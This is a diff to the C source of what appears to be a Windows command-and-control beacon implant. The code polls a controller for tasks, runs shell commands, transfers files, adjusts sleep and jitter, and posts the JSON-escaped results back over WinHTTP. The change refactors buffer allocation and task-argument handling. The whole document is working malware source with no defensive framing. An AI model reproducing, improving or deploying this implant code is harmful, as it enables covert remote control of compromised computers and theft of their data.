@@ -148,7 +148,7 @@ static void http_post_json(BEACON_CTX *ctx, const wchar_t *path,
     WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
 }
 
-/* ── JSON-escape output ─────────────────────────────────── */
+/* ── JSON-escape helpers ────────────────────────────────── */
 static int json_escape(const char *src, DWORD src_len, char *dst, int dst_sz) {
     int i = 0;
     for (DWORD k = 0; k < src_len && i < dst_sz - 2; k++) {
@@ -170,28 +170,27 @@ void beacon_submit_result(BEACON_CTX *ctx, TASK_RESULT *result) {
     const char *out    = (result->output && result->output_len) ? result->output : "";
     DWORD       out_ln = (result->output && result->output_len) ? result->output_len : 0;
 
-    /* base64 output (download) needs no escaping; shell output does */
-    int esc_cap = (int)(out_ln * 2 + 16);
-    char *esc_out = (char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)esc_cap);
-    if (!esc_out) return;
-    json_escape(out, out_ln, esc_out, esc_cap);
+    /* single allocation: prefix + worst-case escaped output + suffix + error */
+    SIZE_T body_cap = (SIZE_T)out_ln * 2 + 768;
+    char  *body     = (char *)HeapAlloc(GetProcessHeap(), 0, body_cap);
+    if (!body) return;
 
-    char esc_err[1024];
-    json_escape(result->error, (DWORD)strlen(result->error), esc_err, sizeof(esc_err));
+    /* write prefix */
+    int off = snprintf(body, body_cap,
+        "{\"task_id\":\"%s\",\"beacon_id\":%lu,\"output\":\"",
+        result->task_id, (unsigned long)ctx->beacon_id);
 
-    int body_cap = esc_cap + 256;
-    char *body = (char *)HeapAlloc(GetProcessHeap(), 0, (SIZE_T)body_cap);
-    if (!body) { HeapFree(GetProcessHeap(), 0, esc_out); return; }
+    /* escape output inline */
+    off += json_escape(out, out_ln, body + off, (int)(body_cap - (SIZE_T)off - 64));
 
-    int body_len = snprintf(body, (size_t)body_cap,
-        "{\"task_id\":\"%s\",\"beacon_id\":%lu,\"output\":\"%s\",\"error\":\"%s\"}",
-        result->task_id, (unsigned long)ctx->beacon_id, esc_out, esc_err);
+    /* error field */
+    off += snprintf(body + off, body_cap - (SIZE_T)off, "\",\"error\":\"");
+    off += json_escape(result->error, (DWORD)strlen(result->error),
+                       body + off, (int)(body_cap - (SIZE_T)off - 3));
+    off += snprintf(body + off, body_cap - (SIZE_T)off, "\"}");
 
-    if (body_len > 0)
-        http_post_json(ctx, L"/result", body, (DWORD)body_len);
-
+    http_post_json(ctx, L"/result", body, (DWORD)off);
     HeapFree(GetProcessHeap(), 0, body);
-    HeapFree(GetProcessHeap(), 0, esc_out);
 }
 
 /* ── task poll and dispatch ─────────────────────────────── */
@@ -222,7 +221,7 @@ void beacon_poll_tasks(BEACON_CTX *ctx) {
         }
         if (depth != 0) break;
 
-        /* parse task fields */
+        /* parse task fields — args and data are heap-allocated */
         PARSED_TASK task;
         memset(&task, 0, sizeof(task));
         json_str(obj_start, obj_end, "task_id", task.task_id, sizeof(task.task_id));
@@ -230,27 +229,24 @@ void beacon_poll_tasks(BEACON_CTX *ctx) {
 
         if (task.task_id[0] == '\0') { p = obj_end; continue; }
 
-        if (strcmp(task.type, TASK_TYPE_SHELL) == 0 ||
-            strcmp(task.type, TASK_TYPE_DOWNLOAD) == 0) {
-            json_str(obj_start, obj_end, "args", task.args, sizeof(task.args));
-        } else if (strcmp(task.type, TASK_TYPE_SLEEP) == 0) {
-            json_str(obj_start, obj_end, "args", task.args, sizeof(task.args));
+        if (strcmp(task.type, TASK_TYPE_SHELL)    == 0 ||
+            strcmp(task.type, TASK_TYPE_DOWNLOAD)  == 0 ||
+            strcmp(task.type, TASK_TYPE_SLEEP)     == 0) {
+            task.args = json_str_heap(obj_start, obj_end, "args", &task.args_len);
         } else if (strcmp(task.type, TASK_TYPE_UPLOAD) == 0) {
-            json_str(obj_start, obj_end, "args", task.args, sizeof(task.args));
+            task.args = json_str_heap(obj_start, obj_end, "args", &task.args_len);
             task.data = json_str_heap(obj_start, obj_end, "data", &task.data_len);
         }
 
-        /* allocate result */
+        /* allocate result — handlers grow output via HeapReAlloc as needed */
         TASK_RESULT *result = (TASK_RESULT *)HeapAlloc(GetProcessHeap(),
                                                         HEAP_ZERO_MEMORY,
                                                         sizeof(TASK_RESULT));
-        if (!result) { p = obj_end; continue; }
+        if (!result) { p = obj_end; goto next; }
         memcpy(result->task_id, task.task_id, sizeof(result->task_id) - 1);
 
-        DWORD out_cap = (strcmp(task.type, TASK_TYPE_DOWNLOAD) == 0)
-                        ? FILE_OUT_CAP : SHELL_OUT_CAP;
-        result->output     = (char *)HeapAlloc(GetProcessHeap(), 0, out_cap);
-        result->output_cap = out_cap;
+        result->output     = (char *)HeapAlloc(GetProcessHeap(), 0, OUT_INIT_CAP);
+        result->output_cap = OUT_INIT_CAP;
         result->output_len = 0;
         if (result->output) result->output[0] = '\0';
 
@@ -265,7 +261,7 @@ void beacon_poll_tasks(BEACON_CTX *ctx) {
             beacon_exec_upload(&task, result);
         } else if (strcmp(task.type, TASK_TYPE_SLEEP) == 0) {
             unsigned long ms = ctx->sleep_ms, jitter = ctx->jitter_pct;
-            if (task.args[0]) sscanf(task.args, "%lu %lu", &ms, &jitter);
+            if (task.args) sscanf(task.args, "%lu %lu", &ms, &jitter);
             ctx->sleep_ms   = (DWORD)ms;
             ctx->jitter_pct = (DWORD)jitter;
             if (result->output) {
@@ -287,7 +283,10 @@ void beacon_poll_tasks(BEACON_CTX *ctx) {
 
         if (result->output) HeapFree(GetProcessHeap(), 0, result->output);
         HeapFree(GetProcessHeap(), 0, result);
-        if (task.data)      HeapFree(GetProcessHeap(), 0, task.data);
+
+next:
+        if (task.args) HeapFree(GetProcessHeap(), 0, task.args);
+        if (task.data) HeapFree(GetProcessHeap(), 0, task.data);
 
         if (should_exit) ExitProcess(0);
         p = obj_end;
